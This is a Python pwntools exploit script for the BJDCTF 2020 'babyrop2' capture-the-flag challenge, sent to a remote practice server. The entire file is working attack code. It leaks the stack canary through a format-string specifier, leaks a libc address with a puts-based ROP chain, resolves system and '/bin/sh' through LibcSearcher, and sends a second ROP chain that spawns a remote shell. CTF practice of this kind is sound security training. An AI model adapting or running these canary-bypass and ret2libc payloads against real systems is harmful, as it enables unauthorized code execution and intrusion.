# coding:utf-8

from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

#p = process('bjdctf_2020_babyrop2')
p = remote('node3.buuoj.cn', 26717)
elf = ELF('bjdctf_2020_babyrop2')

read_got = elf.got['read']
puts_plt = elf.plt['puts']
main_addr = elf.sym['main']
vuln_addr = elf.sym['vuln']
pop_rdi_ret = 0x0400993   # ropper -> search pop|ret
padding = 'a' * (0x20-0x8)
p.sendlineafter('u!', '%11$p')  # leak canary
p.recv()
canary = p.recvuntil('\n')[:-1]
de_canary = int(canary.decode(), 16)

payload1 = padding + p64(de_canary) + 'k1ose2jo' + p64(pop_rdi_ret)
payload1 += p64(read_got) + p64(puts_plt) + p64(vuln_addr)

p.sendafter('story!', payload1)
p.recv()
read_addr = u64(p.recv(6).ljust(8, '\x00'))
print('read_addr: ', read_addr)

libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

payload2 = padding + p64(de_canary) + 'k1ose2jo' + p64(pop_rdi_ret)
payload2 += p64(str_bin_sh) + p64(system_addr) + p64(main_addr)

p.sendafter('story!', payload2)
p.interactive()
